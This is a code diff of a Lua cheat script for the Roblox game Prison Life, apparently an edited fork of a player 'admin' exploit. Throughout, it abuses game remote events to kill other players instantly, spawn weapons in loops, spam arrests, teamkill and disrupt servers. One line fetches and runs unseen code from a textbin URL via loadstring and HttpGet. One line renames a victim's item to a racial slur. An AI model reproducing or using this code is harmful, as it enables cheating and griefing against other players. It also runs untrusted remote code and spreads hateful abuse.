+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+
+wait(0.6)
+
+saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+local tbl_main = 
+{
+      game:GetService("Players").LocalPlayer, 
+      "Bright violet"
+}
+game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+
+wait(0.6)
+
+saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+local tbl_main = 
+{
+      game:GetService("Players").LocalPlayer, 
+      "Neon green"
+}
+game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+
+wait(0.6)
+
+saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+local tbl_main = 
+{
+      game:GetService("Players").LocalPlayer, 
+      "Rust"
+}
+game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 end
-			elseif msg:match(prefix .. "walls off") then
+	elseif msg:match(prefix .. "walls off") then
     L = game.Lighting
     PH = workspace.Prison_Halls
     PGO = workspace.Prison_Guard_Outpost
@@ -1125,8 +1320,66 @@ end
 						CIH.Disabled = true
 					end
 				)
-			elseif msg:match(prefix .. "punch") then
+			elseif msg:match(prefix .. "punch on") then
+				_G.toggle = true
 
+                		while _G.toggle == true do
+                		wait()
+				local meleeRemote = game.ReplicatedStorage.meleeEvent
+				local mouse = LocalPlayer:GetMouse()
+				local punching = false
+				local cooldown = false
+
+				function punch()
+					cooldown = true
+					local part = Instance.new("Part")
+					part.Parent = LocalPlayer.Character
+					part.Transparency = 1
+					part.Size = Vector3.new(5, 2, 3)
+					part.CanCollide = false
+					local w1 = Instance.new("Weld", part)
+					w1.Part0 = LocalPlayer.Character.Torso
+					w1.Part1 = part
+					w1.C1 = CFrame.new(0, 0, 2)
+
+					_G.parttouch =  part.Touched:Connect(
+						function(hit)
+							if game.Players:FindFirstChild(hit.Parent.Name) then
+								local plr = game.Players:FindFirstChild(hit.Parent.Name)
+								if plr.Name ~= LocalPlayer.Name then
+									part:Destroy()
+
+									for i = 1, 100 do
+										meleeRemote:FireServer(plr)
+									end
+								end
+							end
+						end
+					)
+					wait(1)
+					cooldown = false
+					part:Destroy()
+				end
+
+
+				local OnePunch =
+					mouse.KeyDown:Connect(
+						function(key)
+						if cooldown == false then
+							if key:lower() == "f" then
+								punch()
+							end
+						end
+					end
+					)
+				table.insert(onepunchconnection, OnePunch)
+				table.insert(onepunchconnection, _G.parttouch)
+
+			elseif msg:match(prefix .. "punch off") then
+				_G.toggle = false
+
+                		while _G.toggle == true do
+                		wait()
 				local meleeRemote = game.ReplicatedStorage.meleeEvent
 				local mouse = LocalPlayer:GetMouse()
 				local punching = false
@@ -1181,12 +1434,38 @@ end
 				for i, v in pairs(onepunchconnection) do
 					v:Disconnect()
 					warn("gone")
-					ConsoleMessage("[Midnight's Admin] one punch disabled")
+					ConsoleMessage("[Edited Admin] one punch disabled")
 				end
             
-			elseif msg:match(prefix .. "slayers") then
-                		loadstring(game:HttpGet("https://raw.githubusercontent.com/Slayer35167/slayerandsionrepository/main/yus"))()
-			elseif msg:match(prefix.."asa") then
+	elseif msg:match(prefix.."asa on") then
+				_G.toggle = true
+
+                		while _G.toggle == true do
+                		wait()
+				local players = game:GetService("Players")
+				local rs = game:GetService("RunService")
+
+				rs.Stepped:Connect(function()
+					pcall(function()
+						local Player = game:GetService("Players").LocalPlayer
+						local Team = game:GetService("Teams")["Criminals"]
+
+						if Player.Team == Team then
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916.297546, 99.9900055, 2383.50928)
+							wait(0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
+							workspace.Remote.TeamEvent:FireServer("Bright blue")
+							wait(0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(916.297546, 99.9900055, 2383.50928)
+							wait(0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001)
+							workspace.Remote.TeamEvent:FireServer("Bright blue")
+						end
+					end)
+				end)
+			elseif msg:match(prefix .. "asa off") then
+				_G.toggle = false
+
+                		while _G.toggle == true do
+                		wait()
 				local players = game:GetService("Players")
 				local rs = game:GetService("RunService")
 
@@ -1251,7 +1530,7 @@ end
 				end)
 				setreadonly(MT, true)
 
-			elseif msg:match(prefix.."tp ") then
+			elseif msg:match(prefix.."to ") then
 				LocalPlayer.Character.HumanoidRootPart.CFrame = findPlr( msg:sub(5) ).Character.HumanoidRootPart.CFrame
 
 			elseif msg:match(prefix.."display") then
@@ -1264,94 +1543,6 @@ end
 				for _, v in pairs(game:GetDescendants()) do
 					v.Material = Enum.Material.Plastic
 				end
-
-
-			elseif msg:match(prefix.."carfly") then
-				local hint = Instance.new("Hint",game.Players.LocalPlayer.PlayerGui)
-				hint.Text = "Press Z To Toggle"
-				hint.Name = game.JobId
-				repeat wait()
-				until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
-				local mouse = game.Players.LocalPlayer:GetMouse()
-				repeat wait() until mouse
-				local plr = game.Players.LocalPlayer
-				local torso = plr.Character.Torso
-				local flying = true
-				local deb = true
-				local ctrl = {f = 0, b = 0, l = 0, r = 0}
-				local lastctrl = {f = 0, b = 0, l = 0, r = 0}
-				local maxspeed = 500
-				local speed = 0
-
-				function Fly()
-					local bg = Instance.new("BodyGyro", torso)
-					bg.P = 1690e0
-					bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-					bg.cframe = torso.CFrame
-					local bv = Instance.new("BodyVelocity", torso)
-					bv.velocity = Vector3.new(0,0.1,0)
-					bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
-					repeat wait()
-						plr.Character.Humanoid.PlatformStand = false
-						if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
-							speed = speed+125.0+(speed/maxspeed)
-							if speed > maxspeed then
-								speed = maxspeed
-							end
-						elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
-							speed = speed-250
-							if speed < 0 then
-								speed = 0
-							end
-						end
-						if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
-							bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
-							lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
-						elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
-							bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
-						else
-							bv.velocity = Vector3.new(0,0.1,0)
-						end
-						bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
-					until not flying
-					ctrl = {f = 0, b = 0, l = 0, r = 0}
-					lastctrl = {f = 0, b = 0, l = 0, r = 0}
-					speed = 0
-					bg:Destroy()
-					bv:Destroy()
-					plr.Character.Humanoid.PlatformStand = false
-				end
-				mouse.KeyDown:connect(function(key)
-					if key:lower() == "Z" then
-						if flying then flying = false
-						else
-							flying = true
-							Fly()
-						end
-					elseif key:lower() == "w" then
-						ctrl.f = 1
-					elseif key:lower() == "s" then
-						ctrl.b = -1
-					elseif key:lower() == "a" then
-						ctrl.l = -1
-					elseif key:lower() == "d" then
-						ctrl.r = 1
-					end
-				end)
-				mouse.KeyUp:connect(function(key)
-					if key:lower() == "w" then
-						ctrl.f = 0
-					elseif key:lower() == "s" then
-						ctrl.b = 0
-					elseif key:lower() == "a" then
-						ctrl.l = 0
-					elseif key:lower() == "d" then
-						ctrl.r = 0
-					end
-					wait(5)
-					hint:Destroy()
-				end)
-				Fly()
 
 			elseif msg:match(prefix.."fix") then
 				while wait() do
@@ -1388,20 +1579,47 @@ end
 						then if v.Bullets then v.CurrentAmmo = 30 v.MaxAmmo = 30 end end end end) end
 			elseif msg:match(prefix.."srg") then
 				loadstring(game:HttpGet(('https://textbin.net/raw/m6pc6xwtxx'),true))()
-			elseif msg:match(prefix.."M4A1") then
+			elseif msg:match(prefix.."M4") then
 				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
-			elseif msg:match(prefix.."AK47") then
+			elseif msg:match(prefix.."AK") then
 				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
 			elseif msg:match(prefix.."REMI") then
 				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
 			elseif msg:match(prefix.."M9") then
 				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+			elseif msg:match(prefix .. "lmelee on") then
+_G.toggle = true
+
+while _G.toggle == true do
+wait()
+local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].single.Hammer.ITEMPICKUP;
+local Target = game:GetService("Workspace").Remote.ItemHandler;
+Target:InvokeServer(userdata_1);
+local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].single["Crude Knife"].ITEMPICKUP;
+local Target = game:GetService("Workspace").Remote.ItemHandler;
+Target:InvokeServer(userdata_1);
+end
+end
+
+			elseif msg:match(prefix .. "lmelee off") then
+_G.toggle = false
+
+while _G.toggle == true do
+wait()
+local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].single.Hammer.ITEMPICKUP;
+local Target = game:GetService("Workspace").Remote.ItemHandler;
+Target:InvokeServer(userdata_1);
+local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].single["Crude Knife"].ITEMPICKUP;
+local Target = game:GetService("Workspace").Remote.ItemHandler;
+Target:InvokeServer(userdata_1);
+end
+end
 			elseif msg:match(prefix .. "nolag") then
 				for i = 1,99 do
 					game.workspace.Prison_ITEMS.clothes.Parent = game.Lighting
 				end
 			elseif msg:match(prefix .. "script") then
-				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("script edited by TakingSoulsHAHAHA # 17 66", "All")
+				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("script edited by onceuponatimeidk # 17 66", "All")
 			elseif msg:match(prefix .. "clothes") then
 				saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 				local tbl_main = 
@@ -1461,8 +1679,46 @@ end
 
 			elseif msg:match(prefix.."rj") then
 				game.TeleportService:Teleport(game.PlaceId)
+			elseif msg:match(prefix .. "scd on") then
+_G.toggle = true
 
+while _G.toggle == true do
+wait()
+local lcd = (game.Players.LocalPlayer.Name)
 
+local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Garage Buttons"].open;
+local Target = game:GetService("Workspace").Remote.ItemHandler;
+Target:InvokeServer(userdata_1);
+wait(0.001)
+local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Garage Buttons"].close;
+local Target = game:GetService("Workspace").Remote.ItemHandler;
+Target:InvokeServer(userdata_1);
+wait(0.001)
+end
+			elseif msg:match(prefix .. "scd off") then
+_G.toggle = false
+
+while _G.toggle == true do
+wait()
+local lcd = (game.Players.LocalPlayer.Name)
+
+local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Garage Buttons"].open;
+local Target = game:GetService("Workspace").Remote.ItemHandler;
+Target:InvokeServer(userdata_1);
+wait(0.001)
+local userdata_1 = game:GetService("Workspace")["Prison_ITEMS"].buttons["Garage Buttons"].close;
+local Target = game:GetService("Workspace").Remote.ItemHandler;
+Target:InvokeServer(userdata_1);
+wait(0.001)
+end
+			elseif msg:match(prefix .. "cbase on") then
+                game.Workspace.Warehouses.Parent = game.Lighting
+                game.Workspace.Warehouse2.Parent = game.Lighting
+                game.Workspace.Warehouse2.Parent = game.Lighting
+			elseif msg:match(prefix .. "cbase off") then
+                game.Lighting.Warehouses.Parent = game.workspace
+                game.Lighting.Warehouse2.Parent = game.workspace
+                game.Lighting.Warehouse2.Parent = game.workspace
 			elseif msg:match(prefix.."bring ") then
 				function EquipTools()
 					for a, b in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
@@ -1507,7 +1763,11 @@ end
 				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = _startpos2
 				findPlr(tostring(msg:sub(8))).Character:FindFirstChild("Bring Gun").Name = "nigger die"
 				
-			elseif msg:match(prefix .. "ff") then
+			elseif msg:match(prefix .. "ff on") then
+_G.toggle = true
+
+while _G.toggle == true do
+wait(0.1)
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
 {
@@ -1516,14 +1776,36 @@ local tbl_main =
 }
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+workspace.Remote.TeamEvent:FireServer("Bright orange")
 wait(9.3)
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local A_1 = "\66\114\111\121\111\117\98\97\100\100"
 local Event = game:GetService("Workspace").Remote.loadchar
 Event:InvokeServer(A_1)
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+end
 
+			elseif msg:match(prefix .. "ff off") then
+_G.toggle = false
 
+while _G.toggle == true do
+wait(0.1)
+saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+local tbl_main = 
+{
+      game:GetService("Players").LocalPlayer, 
+      "Really red"
+}
+game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+workspace.Remote.TeamEvent:FireServer("Bright orange")
+wait(9.3)
+saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+local A_1 = "\66\114\111\121\111\117\98\97\100\100"
+local Event = game:GetService("Workspace").Remote.loadchar
+Event:InvokeServer(A_1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+end
 			elseif msg:match(prefix.."crim ") then
 
 				function EquipTools()
@@ -1591,53 +1873,55 @@ game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
 				print[[
         ---Main Commands---
-        !respawn - Respawns
-        !auto - AutoRespawn
-        !prefix - ~Prefix (NewPrefixHere)
-        !punch - One Punch [On Or Off]
+        !re - Respawns
+        !auto on - AutoRespawn
+	!auto off (off AutoRespawn)
+        !prefix - !prefix (NewPrefixHere)
+        !punch on - (On punch)
+	!punch off - (Off punch)
         !nopunch - No Punch
         !silentaim - silent aim lock
         !bring - Brings a player
         !crim - Crims a player
-        !tp - Tp's to a player
-        !crash - Crashes Server [BROKEN]
+        !to (player) - Tp's to a player
+        !end - *DISCONNECTS* SERVER [BE CAREFUL]
         !lguns on - Loopguns
-        !lguns off
-        !CA
+        !lguns off - unloopguns
+        !ca - Click Arrest
         !bulletspike - bullet spike
         !barcodehub - another free admin
         !fling - flings
         !adonis - fe admin for any game
         !close - Alt + F4
-        !FE Drill - not fe but ok
+        !fe drill - not fe but ok
         !k [i, g, c, all] - Teamkills
-        !walls on
-        !fences on
-        !doors on
-        !doors off
-        !fences off
-        !walls off
-        !fix Camera Fix
-        !carfly - Flycar
-        !btools - regular 1 tool btools delete walls
+        !walls on - on walls
+        !fences on - on fences
+        !doors on - on doors
+        !doors off - off doors
+        !fences off - off fences
+        !walls off - off walls
+        !fix - Camera Fix
+        !btools - (delete certain walls)
         !display - Display Mode
-        !asa - Anti Spam Arrest
+        !asa on - Anti Spam Arrest
+	!asa off (Off asa)
         !lock - Anti tazeall-
-        !chat - chat bypass
+        !chat - Chat Bypass
         !tazeall- Taze All
         !inf - shotty bullets
         !headless - Headless Head
         !noleg - No Legs
-        !rgb on
-        !rgb off
+        !rgb on - Cycles Colors
+        !rgb off - (off) Cycles Colors
         !rj - Rejoin
         !clothes - Removes Prison Clothes
-        !M4A1 - Gives M4A1
-        !AK47 - Gives AK47
-        !REMI - Gives Remington870
+        !M4 - Gives M4
+        !AK - Gives AK
+        !REMI - Gives REMI
         !M9 - Gives M9
-        !sagui
-        !antibring - Antibring
+        !sagui - Spam Arrest Gui 3x Is OP (do !al first)
+        !ab - Antibring
 
 
         ---Teleports--
@@ -1684,10 +1968,10 @@ game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
         !C Mint
         !C Cyan
         !C Custom
-        !Team Crims
-        !Team Guards
-        !Team Neutral
-        !Team in
+        !c
+        !g
+        !n
+        !i
     ]]
 
 			end-- cmd end
